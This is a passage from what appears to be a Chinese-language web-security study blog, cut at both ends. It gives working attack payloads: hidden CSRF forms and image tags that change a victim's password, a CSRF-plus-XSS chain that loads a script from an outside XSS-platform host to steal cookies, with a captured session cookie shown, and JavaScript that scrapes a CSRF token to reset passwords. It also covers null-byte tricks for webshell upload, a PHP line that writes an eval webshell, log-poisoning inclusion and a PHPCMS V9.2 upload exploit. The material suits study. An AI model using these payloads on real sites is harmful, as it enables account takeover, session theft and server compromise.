attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>haozai<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>passwd2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>haozai<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload构造2</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://img0.baidu.com/it/u<span class="token punctuation">=</span>2229594513,3757512062&amp;fm<span class="token punctuation">=</span>253&amp;fmt<span class="token punctuation">=</span>auto&amp;app<span class="token punctuation">=</span>138&amp;f<span class="token punctuation">=</span>JPEG?w<span class="token punctuation">=</span>400&amp;h<span class="token punctuation">=</span>400<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.z.com/user/updatePass.php?passwd<span class="token punctuation">=</span>haozai&amp;passwd2<span class="token punctuation">=</span>haozai&amp;submit<span class="token punctuation">=</span>%E6%9B%B4%E6%96%B0<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XSS和CSRF结合利用1"><a href="#XSS和CSRF结合利用1" class="headerlink" title="XSS和CSRF结合利用1"></a>XSS和CSRF结合利用1</h2><p>思路： 在修改用户名的时候存在csrf漏洞，但是无法利用。不过，修改完用户名，会自动更新session，把修改后的用户名显示，因此这里又存在XSS漏洞，所以，如果我们使用csrf漏洞，让用户修改了自己的用户名，把用户名中打入XSS平台网址，这样就可以获取到cookie啥的信息。</p><p>Q1：为什么不直接使用XSS</p><p>A1： 这里的XSS利用条件苛刻，需要在用户名那里回显，我们是没办法直接利用XSS。</p><h3 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--1. 使用csrf修改用户名--></span><span class="token comment" spellcheck="true">&lt;!--2. 在用户名中打入XSS平台，获取用户的cookie--></span><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user/updateName.php<span class="token punctuation">"</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="username" value="xssok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>http://xsscom.com//dFn6Yv</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到的数据</p><pre class="line-numbers language-http"><code class="language-http">location : http://www.z.com/user/edit.phptoplocation : http://www.z.com/user/edit.phpcookie : _ga=GA1.2.80458560.1673597664; PHPSESSID=v7esh3daqldmcu27mu8f3gd2e1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="XSS和CSRF结合利用2"><a href="#XSS和CSRF结合利用2" class="headerlink" title="XSS和CSRF结合利用2"></a>XSS和CSRF结合利用2</h2><h3 id="1、场景说明："><a href="#1、场景说明：" class="headerlink" title="1、场景说明："></a>1、场景说明：</h3><p>现在有一个XSS漏洞和CSRF漏洞，但是CSRF漏洞有token验证，因此无法直接利用CSRF漏洞，此时有两种方式，一种使用burp工具，另一种方式则配合XSS漏洞，使用JS脚本，获取到token后进行csrf利用。</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230130120311541.png" alt="image-20230130120311541"></p><h3 id="2、js代码"><a href="#2、js代码" class="headerlink" title="2、js代码"></a>2、js代码</h3><pre class="line-numbers language-js"><code class="language-js"> <span class="token comment" spellcheck="true">// alert(document.cookie);</span><span class="token keyword">var</span> theUrl <span class="token operator">=</span> <span class="token string">'http://www.d.com/vulnerabilities/csrf/'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//进制跨域访问</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>    xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span>onreadystatechange<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//请求成功</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span><span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xmlhttp<span class="token punctuation">.</span>status<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">var</span> text <span class="token operator">=</span> xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>            <span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/user_token\' value\=\'(.*?)\' \/\>/</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//通过正则表达式获取token</span>            <span class="token keyword">var</span> match <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//alert(match[1]); //获取token</span>                <span class="token keyword">var</span> token <span class="token operator">=</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token keyword">var</span> new_url <span class="token operator">=</span> <span class="token string">'http://www.d.com/vulnerabilities/csrf/?user_token='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">//发送新的请求</span>                        count<span class="token operator">++</span><span class="token punctuation">;</span>                        xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>new_url<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>theUrl<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>下面是用 URL 编码形式表示的 ASCII 字符</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/70.png" alt="img"></p><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示[字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><pre class="line-numbers language-php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//mp.csdn.net/upfiles/?filename=test.txt              此时输出的是test.txt</span>加上<span class="token operator">%</span><span class="token number">00</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//mp.csdn.net/upfiles/?filename=test.php%00.txt          此时输出的是test.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>就绕过了后缀限制，可以上传webshell啦。</p><p><code>超全局变量$ _get已被解码，例如："超全局变量$ _GET和$ _REQUEST已被解码。在$ _GET或$ _REQUEST中的元素上使用urldecode()可能会出现意外情况和危险的结果。"</code></p><p>这里的截断属于操作系统层面，当查找目录的时候操作系统会因为到%00后面的都被截断。在PHP代码中，并不会把%00截断。</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230118215136380.png" alt="image-20230118215136380"></p><h4 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h4><p>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/2018060210230267.png" alt="img"></p><p> 这里在php的后面添加了一个空格和字母a,其实a写不写都可以，这里加a是为了显示空格的位置。</p><p>空格是为了占位，方便修改00。</p><p>然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00：</p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/20180602102550553.png" alt="img"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/20180602102600467.png" alt="img"></p><p>就绕过了后缀限制，可以上传webshell啦。</p><h4 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h4><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p><h3 id="方式1：先上传在包含"><a href="#方式1：先上传在包含" class="headerlink" title="方式1：先上传在包含"></a>方式1：先上传在包含</h3><p>先上传小马（从图片上传接口）后， 在进行文件包含</p><h3 id="方式2：通过写入日志进行包含"><a href="#方式2：通过写入日志进行包含" class="headerlink" title="方式2：通过写入日志进行包含"></a>方式2：通过写入日志进行包含</h3><p>通过爆出绝对路径，找到绝对路径，在通过绝对路径找到日志目录路径，把一句话写入日志目录中。</p><p>1、找到服务器类型，爆出绝对路径</p><p>2、找到日志文件</p><p>3、把一句话写入日志</p><p>4、包含日志文件</p><h3 id="方式3：使用php伪协议包含"><a href="#方式3：使用php伪协议包含" class="headerlink" title="方式3：使用php伪协议包含"></a>方式3：使用php伪协议包含</h3><p>使用php://input , php://input会直接读取post数据。</p><p>写入一句话:</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_REQUEST["x"]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方式4：远程包含"><a href="#方式4：远程包含" class="headerlink" title="方式4：远程包含"></a>方式4：远程包含</h3><p>远程文件包含，需要把两个参数打开</p><ul><li>allow_url_include = on</li><li>allow_url_fopen = on</li></ul><h3 id="方式5：截断方式"><a href="#方式5：截断方式" class="headerlink" title="方式5：截断方式"></a>方式5：截断方式</h3><p>如果后缀名固定可以使用00截断，#， 注释的手法</p><p><code>http://www.z.com/about.php?f=header.php#llll</code></p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="1-什么是CSP"><a href="#1-什么是CSP" class="headerlink" title="1.什么是CSP"></a>1.什么是CSP</h2><p><strong>Content Security Policy</strong> （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p><p>简单来说，csp就是为了减少xss，csrf等攻击的，是通过控制可信来源的方式，类似于同源策略…</p><p>CSP以白名单的机制对网站加载或执行的资源起作用。在网页中，这样的策略通过 HTTP 头信息或者 meta 元素定义。CSP虽然提供了强大的安全保护，但是他也造成了如下问题：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本。这些问题阻碍CSP的普及，如果要使用CSP技术保护自己的网站，开发者就不得不花费大量时间分离内嵌的JavaScript代码和做一些调整…</p><h2 id="2-CSP的来源"><a href="#2-CSP的来源" class="headerlink" title="2.CSP的来源"></a>2.CSP的来源</h2><p>我们经常见到的CSP都是类似于这样的：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span><span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'none'</span><span class="token punctuation">;</span> connect<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>frame<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> script<span class="token operator">-</span>src xxxx<span class="token operator">/</span>js<span class="token operator">/</span> <span class="token string">'sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto='</span> <span class="token string">'sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ='</span> <span class="token string">'sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM='</span> <span class="token string">'sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk='</span> <span class="token string">'sha256-bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs='</span><span class="token punctuation">;</span>font<span class="token operator">-</span>src xxxx<span class="token operator">/</span>fonts<span class="token operator">/</span> fonts<span class="token punctuation">.</span>gstatic<span class="token punctuation">.</span>com<span class="token punctuation">;</span> style<span class="token operator">-</span>src xxxx<span class="token operator">/</span>css<span class="token operator">/</span> fonts<span class="token punctuation">.</span>googleapis<span class="token punctuation">.</span>com<span class="token punctuation">;</span>img<span class="token operator">-</span>src <span class="token string">'self'</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面包括了各种各样的写法：</p><p>1、none和self，none代表什么都不匹配，self代表匹配同源的来源<br>2、类似于<a href="https://example.com/path/to/file.js%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BC%9A%E5%8C%B9%E9%85%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%96%E8%80%85https://example.com/%E8%BF%99%E6%A0%B7%E4%BC%9A%E5%8C%B9%E9%85%8D%E6%BA%90%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E3%80%82">https://example.com/path/to/file.js这样的会匹配特殊的文件，或者https://example.com/这样会匹配源下的所有。</a><br>3、第三种是类似于https:，会匹配所有包含这个特殊的格式的来源。<br>4、也有可能是example.com这样的，会匹配所有这个host的来源，或者会有*.example.com,会匹配这个host的所有子域。<br>5、第五种是类似于nonce-qwertyu12345会匹配一个特殊的节点。<br>6、当然还有加密过的类似于sha256-abcd…同样会匹配页面中一个特殊的节点（每次修改这个值都会改变）。</p><h2 id="3-CSP滴水不漏-但存在内网文件上传点"><a href="#3-CSP滴水不漏-但存在内网文件上传点" class="headerlink" title="3.CSP滴水不漏 但存在内网文件上传点"></a>3.CSP滴水不漏 但存在内网文件上传点</h2><p>不知道有多少人了解过cctf2016，其中有一道web题目IDS-Chicken</p><p>题目环境就符合我说的情况，CSP滴水不漏，几乎没办法用任何方式构造xss，但是内网存在上传点，上传文件会被重写为文件，link包含形成xss漏洞。</p><pre><code>&lt;link rel='import' href='/upload/xxxxx'&gt;</code></pre><h1 id="代码审计环境搭建PhpStudey"><a href="#代码审计环境搭建PhpStudey" class="headerlink" title="代码审计环境搭建PhpStudey"></a>代码审计环境搭建PhpStudey</h1><h2 id="1-下载xdebughelper插件"><a href="#1-下载xdebughelper插件" class="headerlink" title="1.下载xdebughelper插件"></a>1.下载xdebughelper插件</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230201213814921.png" alt="image-20230201213814921"></p><h2 id="2-配置php-ini文件"><a href="#2-配置php-ini文件" class="headerlink" title="2.配置php.ini文件"></a>2.配置php.ini文件</h2><pre class="line-numbers language-ini"><code class="language-ini"><span class="token selector">[XDebug]</span><span class="token constant">xdebug.profiler_output_dir</span><span class="token attr-value"><span class="token punctuation">=</span>"E:\phpstudy\tmp\xdebug"</span><span class="token constant">xdebug.trace_output_dir</span><span class="token attr-value"><span class="token punctuation">=</span>"E:\phpstudy\tmp\xdebug"</span><span class="token constant">zend_extension</span><span class="token attr-value"><span class="token punctuation">=</span>"E:\phpstudy\php\php-5.5.38\ext\php_xdebug.dll"</span><span class="token comment" spellcheck="true">;zend_extension="C:\phpStudy20161103\php\php-5.5.38\ext\php_xdebug.dll"</span><span class="token constant">xdebug.remote_enable</span><span class="token attr-value"><span class="token punctuation">=</span>On</span><span class="token comment" spellcheck="true"> ;远程调试</span><span class="token constant">xdebug.remote_autostart</span><span class="token attr-value"><span class="token punctuation">=</span>On </span><span class="token comment" spellcheck="true">;开启远程调试自动启动</span><span class="token comment" spellcheck="true">;xdebug.remote_host=192.168.33.1</span><span class="token constant">xdebug.remote_port</span><span class="token attr-value"><span class="token punctuation">=</span>9001</span><span class="token constant">xdebug.auto_trace</span><span class="token attr-value"><span class="token punctuation">=</span>on </span><span class="token comment" spellcheck="true">;启用代码自动跟踪</span><span class="token constant">xdebug.collect_vars</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token comment" spellcheck="true"> ;收集变量</span><span class="token constant">xdebug.collect_return</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token comment" spellcheck="true"> ;收集返回值</span><span class="token constant">xdebug.collect_params</span><span class="token attr-value"><span class="token punctuation">=</span>4</span><span class="token comment" spellcheck="true">;收集参数</span><span class="token constant">xdebug.collect_assignments</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token constant">xdebug.idekey</span><span class="token attr-value"><span class="token punctuation">=</span>hanpy</span><span class="token constant">xdebug.remote_log</span><span class="token attr-value"><span class="token punctuation">=</span>"/tmp/xdebug.log"</span><span class="token comment" spellcheck="true">;性能分析</span><span class="token constant">xdebug.profiler_enable</span><span class="token attr-value"><span class="token punctuation">=</span>On </span><span class="token comment" spellcheck="true">;启用性能检测分析</span><span class="token comment" spellcheck="true">;xdebug.trace_output_dir="/tmp/xdebug_profiler"</span><span class="token comment" spellcheck="true"> ;指定堆栈跟踪文件的存放目录</span><span class="token constant">xdebug.profiler_output_dir</span><span class="token attr-value"><span class="token punctuation">=</span>"/tmp/xdebug_profiler" </span><span class="token comment" spellcheck="true">;指定性能分析文件的存放目录</span><span class="token constant">xdebug.profiler_output_name</span><span class="token attr-value"><span class="token punctuation">=</span>"cachegrind.out.%p"</span><span class="token constant">xdebug.profiler_enable_trigger</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-配置phpstrom"><a href="#3-配置phpstrom" class="headerlink" title="3.配置phpstrom"></a>3.配置phpstrom</h2><p>3.1配置servers开</p><p>3.2<img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230201213400398.png" alt="image-20230201213400398"></p><p>3.3<img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230201213433542.png" alt="image-20230201213433542"></p><h1 id="PHPCMS-V9-2文件上传漏洞"><a href="#PHPCMS-V9-2文件上传漏洞" class="headerlink" title="PHPCMS V9.2文件上传漏洞"></a>PHPCMS V9.2文件上传漏洞</h1><h2 id="1、漏洞利用"><a href="#1、漏洞利用" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h2><pre><code> 在修改头像功能处，先上传一张正常的图片，抓包，把文件内容修改为带一句话的zip压缩包。</code></pre><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230202112841997.png" alt="image-20230202112841997"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20230202113116088.png" alt="image-20230202113116088"></p><h2 id="2、漏洞分析"><a href="#2、漏洞分析" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h2><p>上传图片的时候，前端对图片进行了处理，数据包中的数据已经是四张压缩一起的zip包，在后端处理的时候，对压缩包进行解压到当前文件夹，解压之后判断当前文件夹内是否有非法文件。由于我们上床的是一个目录压缩包，一句话在目录中，因此绕过检查机制。</p><pre class="line-numbers language-php"><code class="language-php">    <span class="token comment" spellcheck="true">//漏洞代码</span><span class="token comment" spellcheck="true">/**     *  上传头像处理     *  传入头像压缩包，解压到指定文件夹后删除非图片文件     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">uploadavatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//根据用户id创建文件夹</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'avatardata'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uid</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatardata</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">'avatardata'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token variable">$dir1</span> <span class="token operator">=</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token 